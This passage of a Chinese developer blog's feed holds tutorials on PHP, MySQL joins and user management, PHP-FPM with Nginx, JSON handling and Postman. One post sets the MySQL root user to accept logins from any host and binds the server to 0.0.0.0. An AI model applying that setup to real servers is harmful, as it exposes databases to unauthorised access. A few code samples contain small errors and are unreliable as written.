class="line">&#125;</span><br><span class="line">return $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不得不说递归算法真的非常优雅，仅仅不到十来行代码就把这个复杂的问题给解决了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近在业务上遇到一个需求，需要根据已知的一个数一层一层查找除所有对应下级用户，然后将结果放在数组中。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="算法" scheme="https://www.0x2beace.com/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>Mysql 多表联查</title>
    <link href="https://www.0x2beace.com/mysql-multi-table-joint-check/"/>
    <id>https://www.0x2beace.com/mysql-multi-table-joint-check/</id>
    <published>2020-09-24T10:56:22.000Z</published>
    <updated>2020-09-24T10:57:00.944Z</updated>
    
    <content type="html"><![CDATA[<p>Mysql 的两张表联表查询可能大家都知道怎么查，但如果是三张表或者是更多张表呢？</p><a id="more"></a><p>其实不管是两张表还是三张表还是N 张表都是一样的。</p><h3 id="多表联查"><a href="#多表联查" class="headerlink" title="多表联查"></a>多表联查</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 语法一：</span><br><span class="line">select t1.*, t2.*, t3.* </span><br><span class="line">from table1 t1, table2 t2, table3 t3</span><br><span class="line">where t1.id &#x3D; t2.id and t1.id &#x3D; t3.id;</span><br><span class="line"></span><br><span class="line"># 语法二：</span><br><span class="line">select t1.*, t2.*, t3.* </span><br><span class="line">from table t1 inner join table2 t2 </span><br><span class="line">on t1.id &#x3D; t2.id </span><br><span class="line">inner join table3 t3 </span><br><span class="line">on t1.id &#x3D; t3.id;</span><br></pre></td></tr></table></figure><p>有几点需要注意：</p><ol><li>上面的id 并不一定非要使用id，可以是任何有关联性的其他字段</li><li>如果表名是关键字，那么需要查询时在这个关键字上加反引号，如：`order`</li><li><code>inner join</code> 可以根据实际情况可以换成<code>left join</code>、<code>right join</code> </li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;Mysql 的两张表联表查询可能大家都知道怎么查，但如果是三张表或者是更多张表呢？&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>PHP-FPM 与 Nginx 是什么关系？</title>
    <link href="https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/"/>
    <id>https://www.0x2beace.com/what-is-the-relationship-between-php-fpm-and-nginx/</id>
    <published>2020-09-23T14:35:17.000Z</published>
    <updated>2020-09-23T14:41:58.011Z</updated>
    
    <content type="html"><![CDATA[<p>最近部署了几次项目，经常遇到这样一个错误：<code>Nginx 502 bad gateway</code>，查看 Nginx 错误日志之后，发现这样一段话：<code>Primary script unknown</code>，找了好久的答案，总结出以下几个原因：</p><a id="more"></a><ul><li>未启动 Nginx </li><li>未启动 php-fpm</li><li>Nginx 配置异常</li><li>文件夹权限不足</li></ul><p>其中未启动 php-fpm 是出现最多的错误，再聊 php-fpm 之前，我们先来学习几个 相关概念。</p><h3 id="什么是-cgi"><a href="#什么是-cgi" class="headerlink" title="什么是 cgi"></a>什么是 cgi</h3><p>Cgi 是一个协议，它约定了 web server 和应用程序（如：PHP、Python等）之间的信息交换的标准格式。</p><h4 id="静态文件"><a href="#静态文件" class="headerlink" title="静态文件"></a>静态文件</h4><p>当一个客户端试图访问<code>index.html</code>这个文件时，那么 web server 就回去文件系统中找到这个文件，最后将结果返回给客户端。</p><h4 id="非静态文件"><a href="#非静态文件" class="headerlink" title="非静态文件"></a>非静态文件</h4><p>当一个客户端试图访问<code>index.php</code>这个文件时，web server 收到请求之后，根据配置文件知道了自己处理不了，接着转发给第三方的应用程序（PHP解析器、Python解析器等），web server 知道该传哪些数据吗？它不知道，<strong>所以 Cgi 就是约定要传哪些数据，以什么样的格式传递给第三方的应用程序的协议。</strong> 应用程序独立处理完该脚本，然后再将结果返回给产生响应的 web server，最后转发响应至客户端。</p><p>当 web server 收到 <code>index.php</code> 这个请求之后，会启动对应的 cgi 程序（PHP解析器，Python解析器），接下来解析器会解析 php.ini 配置文件，初始化执行环境，然后处理请求，再以 cgi 规定的格式返回处理后的结果，退出进程。web server 将转发响应至客户端。</p><p>这种协议看上去简单有效，但它也存在一些明显不足：</p><ol><li>每一个请求产生唯一一个进程，从一个请求到另一个请求，内容和其他的信息全部丢失。</li><li>开启一个进程会消耗系统的资源，大而重的并发请求（每产生一个进程）数量很快会使服务器一团糟。</li></ol><h3 id="什么是-fastcgi"><a href="#什么是-fastcgi" class="headerlink" title="什么是 fastcgi"></a>什么是 fastcgi</h3><p>知道了 cgi 是协议之后，那 fastcgi 又是什么呢？</p><p>知道了 cgi 服务器性能低下的原因是因为每产生一个请求，都会做同样的事情：解析器解析配置文件，初始化执行环境，启动一个新的进程。</p><p>fastcgi 则是在 cgi 的基础上做了重大的改进，从而达到相同的目的，原理如下：</p><ol><li>fgstcgi 使用了能够处理多个请求的持续进程，而不是针对每个请求都产生新的进程。</li><li>fastcgi 是一个基于套接字的协议，因此它能够适用于任务平台（web server）及任何编程语言。</li></ol><p>fastcgi 的性能之所以高于 cgi，是因为 fastcgi 可以对进程进行管理，而这是 cgi 所做不到的，但它的本质仍然是 协议。</p><h3 id="什么是-php-fpm"><a href="#什么是-php-fpm" class="headerlink" title="什么是 php-fpm"></a>什么是 php-fpm</h3><p>默认情况下，PHP 是支持 cgi 和 fastcgi 协议的。</p><p>PHP 二进制命令能够处理脚本并且能够通过套接字与Nginx 交互，但是这种方式并不是效率最高的，php-fpm 便是在这样的背景下诞生的。</p><p>PHP-FPM （PHP FastCgi 进程管理，PHP Fastcgi Process Manager）</p><p>php-fpm 将 fastcgi 带到了一个全新的水平。</p><h3 id="php-fpm-和-nginx-有什么联系"><a href="#php-fpm-和-nginx-有什么联系" class="headerlink" title="php-fpm 和 nginx 有什么联系"></a>php-fpm 和 nginx 有什么联系</h3><p>在理解了 cgi、fastcgi、php-fpm 是什么之后，就不难理解 php-fpm 和nginx是什么关系了。</p><p>因为 php-fpm 是 php fastcgi 的进程管理器，所以 php-fpm 就是 nginx 与 php 交互时，协助 php 将性能发挥最大的一个程序。</p><p>难怪每次 php-fpm 这个进程死掉时，nginx 的状态就变成了 502 。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://segmentfault.com/q/1010000000256516" target="_blank" rel="noopener">搞不清 Fastcgi 和 cgi 关系</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近部署了几次项目，经常遇到这样一个错误：&lt;code&gt;Nginx 502 bad gateway&lt;/code&gt;，查看 Nginx 错误日志之后，发现这样一段话：&lt;code&gt;Primary script unknown&lt;/code&gt;，找了好久的答案，总结出以下几个原因：&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="Nginx" scheme="https://www.0x2beace.com/tags/Nginx/"/>
    
    <category term="PHP-FPM" scheme="https://www.0x2beace.com/tags/PHP-FPM/"/>
    
  </entry>
  
  <entry>
    <title>如何将 JSON 对象转换成 PHP 数组</title>
    <link href="https://www.0x2beace.com/how-to-convert-a-json-object-into-a-php-array/"/>
    <id>https://www.0x2beace.com/how-to-convert-a-json-object-into-a-php-array/</id>
    <published>2020-09-22T14:58:35.000Z</published>
    <updated>2020-09-22T15:00:32.495Z</updated>
    
    <content type="html"><![CDATA[<p>在介绍如何将JSON 字符串转传为PHP 数组之前，先来复习一下什么是JSON。</p><a id="more"></a><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>通俗一点讲JSON 就是一种数据结构，就是一串字符串，只不过元素会通过特定的符号标注。</p><ul><li><code>{}</code>：大括号表示对象</li><li><code>[]</code>：中括号表示数组</li><li><code>&quot;&quot;</code>：双引号内是属性或值</li></ul><p>标准的JSON 对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 这是一个JSON 对象</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;: &quot;boo&quot;,</span><br><span class="line">    &quot;gender&quot;: &quot;men&quot;,</span><br><span class="line">    &quot;age&quot;: 25</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>标准的JSON 数组：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 这是一个包含两个对象的JSON 数组</span><br><span class="line">[   </span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;boo&quot;,</span><br><span class="line">        &quot;gender&quot;: &quot;men&quot;,</span><br><span class="line">        &quot;age&quot;: 25</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;max&quot;,</span><br><span class="line">        &quot;gender&quot;: &quot;men&quot;,,</span><br><span class="line">        &quot;age&quot;: 29</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 这是一个包含数组的JSON 对象</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:[&quot;Michael&quot;,&quot;Jerry&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在熟悉了几种常见的JSON 字符串之后，在来看一下如何解析JSON 字符串。</p><h3 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h3><p>JSON 对象转换为对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;</span><br><span class="line"></span><br><span class="line">$obj &#x3D; json_decode($jsonObj);</span><br><span class="line">print $obj-&gt;&#123;&quot;name&quot;&#125;;   &#x2F;&#x2F;boo</span><br><span class="line"></span><br><span class="line">$jsonObj2 &#x3D; &#39;[&#123;&quot;name&quot;: &quot;boo&quot;&#125;]&#39;;</span><br><span class="line"></span><br><span class="line">$obj2 &#x3D; json_decode($jsonObj2);</span><br><span class="line">print $obj[0]-&gt;&#123;&quot;name&quot;&#125;;   &#x2F;&#x2F;boo</span><br><span class="line"></span><br><span class="line">object(stdClass)[1]</span><br><span class="line">      public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)</span><br><span class="line"></span><br><span class="line">array (size&#x3D;1)</span><br><span class="line">  0 &#x3D;&gt; </span><br><span class="line">    object(stdClass)[1]</span><br><span class="line">      public &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)</span><br></pre></td></tr></table></figure><p>JSON 对象转换为数组</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$jsonObj &#x3D; &#39;&#123;&quot;name&quot;: &quot;boo&quot;&#125;&#39;;</span><br><span class="line"></span><br><span class="line">$arr &#x3D; json_decode($jsonObj, true);</span><br><span class="line">print $arr[&#39;name&#39;];     &#x2F;&#x2F;boo</span><br><span class="line"></span><br><span class="line">array (size&#x3D;1)</span><br><span class="line">      &#39;name&#39; &#x3D;&gt; string &#39;boo&#39; (length&#x3D;3)</span><br></pre></td></tr></table></figure><p>需要注意几个容易出错的细节：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 大括号外需要使用单引号</span><br><span class="line">$bad_json &#x3D; &quot;&#123; &#39;bar&#39;: &#39;baz&#39; &#125;&quot;;</span><br><span class="line">json_decode($bad_json);    &#x2F;&#x2F; null</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 属性需要使用双引号引起来</span><br><span class="line">$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot; &#125;&#39;;</span><br><span class="line">json_decode($bad_json);    &#x2F;&#x2F; null</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 不允许尾随逗号</span><br><span class="line">$bad_json &#x3D; &#39;&#123; bar: &quot;baz&quot;, &#125;&#39;;</span><br><span class="line">json_decode($bad_json);    &#x2F;&#x2F; null</span><br></pre></td></tr></table></figure><h3 id="json-encode"><a href="#json-encode" class="headerlink" title="json_encode"></a>json_encode</h3><p>下面来看看如何返回JSON 格式的数据，通过使用 <code>json_encode</code>这个函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$b &#x3D; array();</span><br><span class="line"></span><br><span class="line">echo &quot;空数组作为数组输出: &quot;, json_encode($b), &quot;\n&quot;;  &#x2F;&#x2F;空数组作为数组输出：[]</span><br><span class="line">echo &quot;空数组作为对象输出: &quot;, json_encode($b, JSON_FORCE_OBJECT), &quot;\n\n&quot;;   &#x2F;&#x2F;空数组作为对象输出：&#123;&#125;</span><br><span class="line"></span><br><span class="line">$c &#x3D; array(array(1,2,3));</span><br><span class="line"></span><br><span class="line">echo &quot;多维数组作为数组输出: &quot;, json_encode($c), &quot;\n&quot;;       &#x2F;&#x2F;多维数组作为数组输出：[[1,2,3]]</span><br><span class="line">echo &quot;多维数组作为对象输出: &quot;, json_encode($c, JSON_FORCE_OBJECT), &quot;\n\n&quot;;      &#x2F;&#x2F;多维数组作为对象输出：&#123;&quot;0&quot;:&#123;&quot;0&quot;:1,&quot;1&quot;:2,&quot;2&quot;:3&#125;&#125;</span><br><span class="line"></span><br><span class="line">$d &#x3D; array(&#39;foo&#39; &#x3D;&gt; &#39;bar&#39;, &#39;baz&#39; &#x3D;&gt; &#39;long&#39;);</span><br><span class="line"></span><br><span class="line">echo &quot;关联数组只能作为对象输出: &quot;, json_encode($d), &quot;\n&quot;;       &#x2F;&#x2F;关联数组只能作为对象输出：&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;</span><br><span class="line">echo &quot;关联数组只能作为对象输出: &quot;, json_encode($d, JSON_FORCE_OBJECT), &quot;\n\n&quot;;      &#x2F;&#x2F;关联数组只能作为对象输出：&#123;&quot;foo&quot;:&quot;bar&quot;,&quot;baz&quot;:&quot;long&quot;&#125;</span><br><span class="line"></span><br><span class="line">$arr &#x3D; array(</span><br><span class="line">  &quot;name&quot; &#x3D;&gt; &quot;boo&quot;,</span><br><span class="line">  &quot;gender&quot; &#x3D;&gt; &quot;men&quot;,</span><br><span class="line">  &quot;age&quot; &#x3D;&gt; 22</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$res &#x3D; json_encode($arr);</span><br><span class="line">var_dump($res);</span><br><span class="line">echo($res);</span><br><span class="line"></span><br><span class="line">string &#39;&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;&#39; (length&#x3D;35)</span><br><span class="line">&#123;&quot;name&quot;:&quot;boo&quot;,&quot;gender&quot;:&quot;men&quot;,&quot;age&quot;:22&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;在介绍如何将JSON 字符串转传为PHP 数组之前，先来复习一下什么是JSON。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>同一局域网内如何访问项目地址、连接 Mysql</title>
    <link href="https://www.0x2beace.com/how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/"/>
    <id>https://www.0x2beace.com/how-to-access-the-project-address-and-connect-to-mysql-in-the-same-local-area-network/</id>
    <published>2020-09-21T13:42:44.000Z</published>
    <updated>2020-09-23T14:46:39.880Z</updated>
    
    <content type="html"><![CDATA[<p>如标题所示，在团队项目开发中这是两个很常见的问题，记录一下。</p><a id="more"></a><h3 id="局域网内共享项目地址"><a href="#局域网内共享项目地址" class="headerlink" title="局域网内共享项目地址"></a>局域网内共享项目地址</h3><p>有时候会有这样一种需求，自己在本地项目做开发，还没放到服务器上，但是其他人希望能在他的电脑上访问项目。</p><p>这个时候就需要这两台电脑在同一个局域网内，也就是连接相同的WiFi 。</p><p>然后查看自己的外网IP 地址是多少：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># mac&#x2F;linux</span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure><p>外网IP 地址通常是以<code>192.168.x.xxx</code>打头的IP ，然后把这个IP 配置到对应的域名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># mac&#x2F;linux</span><br><span class="line">vim &#x2F;usr&#x2F;etc&#x2F;hosts</span><br><span class="line"></span><br><span class="line"># windows</span><br><span class="line">C:\Windows\ System32 \drivers\etc\hosts</span><br><span class="line"></span><br><span class="line"># hosts </span><br><span class="line">127.0.0.1 example.com</span><br><span class="line">192.168.x.xxx example.com</span><br></pre></td></tr></table></figure><p>配置完成之后，直接把<code>example.com</code>这个域名丢给对方，对方就在他自己的电脑上可以访问了。</p><h3 id="局域网内连接Mysql"><a href="#局域网内连接Mysql" class="headerlink" title="局域网内连接Mysql"></a>局域网内连接Mysql</h3><p>想要在局域网内，让别人能连接到我的数据库，需要注意以下两点：</p><ol><li>对本地Mysql 授权，允许其他用户连接</li><li>Mysql 开放外网访问</li></ol><p>对于第一点，可以以下命令来完成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. mysql -hlocalhost -uroot -p;</span><br><span class="line">2. use mysql;</span><br><span class="line"># 修改权限，允许其他人连接：</span><br><span class="line">3. update user set host&#x3D;&#39;%&#39; where user&#x3D;&quot;root&quot;;</span><br><span class="line">4. flush privileges;</span><br></pre></td></tr></table></figure><p>通常完成第一步，就可以连接了，如果连接异常，可以尝试第二步：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 打开Mysql 配置文件</span><br><span class="line">vim &#x2F;usr&#x2F;local&#x2F;etc&#x2F;my.cnf</span><br><span class="line"></span><br><span class="line">bind-address &#x3D; 0.0.0.0</span><br><span class="line"># 127.0.0.1 替换成 0.0.0.0;</span><br></pre></td></tr></table></figure><p>然后重启Mysql 数据库即可。</p><blockquote><p>其他人怎么连接我的数据库？</p></blockquote><p>把这个丢给他：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">host：你的外网IP 地址</span><br><span class="line">user：你的Mysql 用户</span><br><span class="line">pwd：你的Mysql 密码</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;如标题所示，在团队项目开发中这是两个很常见的问题，记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
    <category term="局域网" scheme="https://www.0x2beace.com/tags/%E5%B1%80%E5%9F%9F%E7%BD%91/"/>
    
    <category term="防火墙" scheme="https://www.0x2beace.com/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"/>
    
  </entry>
  
  <entry>
    <title>mysql5.7用户管理：添加用户、授权、撤权、修改密码</title>
    <link href="https://www.0x2beace.com/mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/"/>
    <id>https://www.0x2beace.com/mysql5-7-user-management-add-users-authorize-revoke-rights-modify-passwords/</id>
    <published>2020-09-20T15:42:13.000Z</published>
    <updated>2020-09-20T15:43:47.158Z</updated>
    
    <content type="html"><![CDATA[<p>因为Mysql 5.7 是目前使用最多的数据库，而5.7 在某些地方又和其他版本有所不同，所以记录一下。</p><a id="more"></a><h2 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 语法：CREATE USER &#39;username&#39;@&#39;host&#39; IDENTIFIED BY &#39;password&#39;;</span><br><span class="line"></span><br><span class="line">mysql&gt;  CREATE USER &#39;boo&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;122410&#39;;</span><br></pre></td></tr></table></figure><p>host 参数说明：</p><ul><li><code>%</code>：匹配所有主机</li><li><code>localhost</code>：当前主机，localhost 不会被解析成IP地址，而是通过UNIXsocket 连接</li><li><code>127.0.0.1</code>：当前主机，通过TCP/IP 协议连接</li><li><code>::1</code>：当前主机，兼容支持ipv6</li></ul><p>此时还没有授权，只能登陆，无法做其余操作</p><h2 id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 创建完成之后授权</span><br><span class="line">mysql&gt; grant all privileges ON &#96;dbName&#96;.* TO &#39;username&#39;@&#39;host&#39;;</span><br><span class="line"></span><br><span class="line"># 创建用户同时授权</span><br><span class="line">mysql&gt; grant all privileges on dbName.* to &#39;username&#39;@&#39;host&#39; identified by &#39;password&#39;;</span><br><span class="line"></span><br><span class="line"># 刷新权限</span><br><span class="line">mysql&gt;  flush privileges;</span><br><span class="line"></span><br><span class="line"># 查看用户所有权限</span><br><span class="line">mysql&gt; show grants for dev@&#39;%&#39;;</span><br><span class="line"></span><br><span class="line"># 撤消用户授权，撤消要求各参数与授权时使用的一致，可以先查看授权再撤消</span><br><span class="line">mysql&gt; revoke privileges ON dbName.* FROM &#39;username&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p>privileges 参数说明：</p><ul><li><code>all privileges</code>: 所有权限；</li><li><code>select</code>: 查询；</li><li><code>insert</code>: 新增记录;</li><li><code>update</code>: 更新记录；</li><li><code>delete</code>: 删除记录；</li><li><code>create</code>: 创建表；</li><li><code>drop</code>: 删除表；</li><li><code>alter</code>: 修改表结构；</li><li><code>index</code>: 索引相关权限；</li><li><code>execute</code>: 执行存储过程与call函数</li><li><code>references</code>： 外键相关；</li><li><code>create temporary tables</code>：创建临时表；</li><li><code>lock tables</code>：锁表；</li><li><code>create view</code>：创建视图；</li><li><code>show view</code>：查看视图结构；</li><li><code>trigger</code>: 触发器；</li></ul><p>dbName 可以是某个库（<code>database</code>），也可以是具体到某张表（<code>database.table</code>），也可以是所整个数据库（<code>*</code>）。</p><h2 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 修改自己的密码</span><br><span class="line">mysql&gt; set password&#x3D;password(&#39;newpassword&#39;);</span><br><span class="line"></span><br><span class="line"># 修改别人密码——方法1</span><br><span class="line">mysql&gt; set password for &#39;username&#39;@&#39;host&#39; &#x3D; password(&#39;newpassword&#39;);</span><br><span class="line"></span><br><span class="line"># 修改别人密码——方法2: 适用mysql5.7以前的版本，5.7以后的版本中mysql.user表没有了password字段</span><br><span class="line">mysql&gt; update mysq.user set password&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;user&#39; and host&#x3D;&#39;host&#39;;</span><br><span class="line"></span><br><span class="line"># 修改别人密码——方法3：适用mysql5.7</span><br><span class="line">mysql&gt; update mysql.user set authentication_string&#x3D;password(&#39;newpassword&#39;) where user&#x3D;&#39;root&#39;;</span><br><span class="line"></span><br><span class="line"># 修改别人密码——方法4</span><br><span class="line">mysql&gt; alter user &#39;test&#39;@&#39;%&#39; identified by &#39;newpassword&#39;;</span><br></pre></td></tr></table></figure><h2 id="删除用户"><a href="#删除用户" class="headerlink" title="删除用户"></a>删除用户</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; DROP USER &#39;username&#39;@&#39;host&#39;;</span><br></pre></td></tr></table></figure><p>不建议直接通过修改<code>mysql.user</code>表去操作用户。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/yu12377/article/details/78214336" target="_blank" rel="noopener">mysql5.7用户管理：添加用户、授权、撤权、修改密码</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;因为Mysql 5.7 是目前使用最多的数据库，而5.7 在某些地方又和其他版本有所不同，所以记录一下。&lt;/p&gt;</summary>
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Postman 使用技巧整理</title>
    <link href="https://www.0x2beace.com/postman-tips/"/>
    <id>https://www.0x2beace.com/postman-tips/</id>
    <published>2020-09-19T12:58:16.000Z</published>
    <updated>2020-10-30T00:22:26.807Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.postman.com/" target="_blank" rel="noopener">Postman</a> 作为http 请求工具，无论是开发还是测试所使用的频率还是挺高的，这篇笔记用来整理一下常用的使用技巧。</p><a id="more"></a><h2 id="发送表单提交"><a href="#发送表单提交" class="headerlink" title="发送表单提交"></a>发送表单提交</h2><p>这里的表单提交就是指传统的表单提交。</p><p>核心请求头信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>body 的数据格式选择<code>form-data</code>。</p><h2 id="发送Ajax-请求"><a href="#发送Ajax-请求" class="headerlink" title="发送Ajax 请求"></a>发送Ajax 请求</h2><p>核心请求头信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 